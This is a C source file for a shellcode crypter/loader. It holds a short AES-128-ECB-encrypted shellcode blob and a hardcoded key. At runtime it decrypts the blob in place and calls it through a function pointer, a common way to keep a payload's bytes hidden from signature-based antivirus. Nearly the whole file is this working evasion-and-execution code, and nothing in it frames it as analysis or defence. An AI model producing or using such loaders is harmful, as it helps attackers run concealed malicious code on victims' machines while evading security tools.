#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define CBC 0
#define ECB 1
#include "aes.h"


#define BLOCK_LENGTH 16

uint8_t key[BLOCK_LENGTH] = { 'm','y','-','b','a','d','-','k','e','y' };        //128bit key
unsigned char shellcode[] =
"\x97\xbb\x2f\x08\xa6\x50\x79\xd6\xe8\x5c\x30\x7c\x0b\x9a\x44\xde\xfd\x1f\x2f\x47\x80\xe9\xd3\xc2\xf0\x4c\x6b\xff\xc5\x10\xa5\x50";


int main(int argc, char **argv)
{
	int (*ret)() = (int(*)())shellcode;
	uint8_t block[BLOCK_LENGTH];
	int i,j;
	int shellcode_size;

	shellcode_size=sizeof(shellcode);
	--shellcode_size;	//Since its posted as string, a unwanted null ybte is at the ende

	if (shellcode_size%BLOCK_LENGTH != 0)
	{
		printf("Wrong shellcode size, not n*16byte\n");
		return 1;
	}



	//decrypt shellcode (to shellcode)
	for (i = 0; i < shellcode_size/BLOCK_LENGTH; ++i)
	{
		AES128_ECB_decrypt(shellcode + i*BLOCK_LENGTH, key, block);

		for (j=0; j<BLOCK_LENGTH; ++j)
		{
//			printf("\\x%02x",block[j]);

			//write into shellcode
			shellcode[i*BLOCK_LENGTH + j] = block[j];
		}

	}


	//run shellcode
	ret();

	printf("\n\n");
	return 1;
}
